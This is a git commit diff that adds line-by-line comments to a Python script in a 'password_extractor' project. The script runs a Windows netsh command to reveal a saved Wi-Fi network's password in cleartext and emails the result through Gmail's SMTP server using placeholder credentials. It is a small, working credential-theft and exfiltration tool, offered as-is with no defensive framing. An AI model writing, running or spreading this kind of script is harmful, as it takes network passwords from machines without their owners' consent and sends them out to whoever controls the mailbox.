e81075fda41a7ac937e40a7d7a7f9e80430c0212
Paweł Orzechowski <110523018+oziesiek@users.noreply.github.com>
2023-09-13 12:52:22 +0200

    Update execute_and_report.py
    comments

--- password_extractor/execute_and_report.py
+++ password_extractor/execute_and_report.py
@@ -1,13 +1,15 @@
 #!/usr/bin/env python
-import subprocess, smtplib
+import subprocess  # Import the subprocess module for running external commands
+import smtplib  # Import the smtplib library for sending emails
 
+# Function to send an email with a given message
 def send_mail(email, password, message):
-    server = smtplib.SMTP("smtp.gmail.com", 587)
-    server.starttls()
-    server.login(email, password)
-    server.sendmail(email, email, message)
-    server.quit()
+    server = smtplib.SMTP("smtp.gmail.com", 587)  # Create an SMTP server connection
+    server.starttls()  # Start TLS encryption for secure communication
+    server.login(email, password)  # Log in to the email account
+    server.sendmail(email, email, message)  # Send the email with the specified message
+    server.quit()  # Quit the SMTP server
 
-command = "netsh wlan show profile WiFi key=clear"
-result = subprocess.check_output(command, shell=True)
-send_mail("your@mail.com", "password", result)
+command = "netsh wlan show profile WiFi key=clear"  # Define the command to retrieve Wi-Fi network profiles
+result = subprocess.check_output(command, shell=True)  # Run the command and capture its output
+send_mail("your@mail.com", "password", result)  # Send the captured output via email
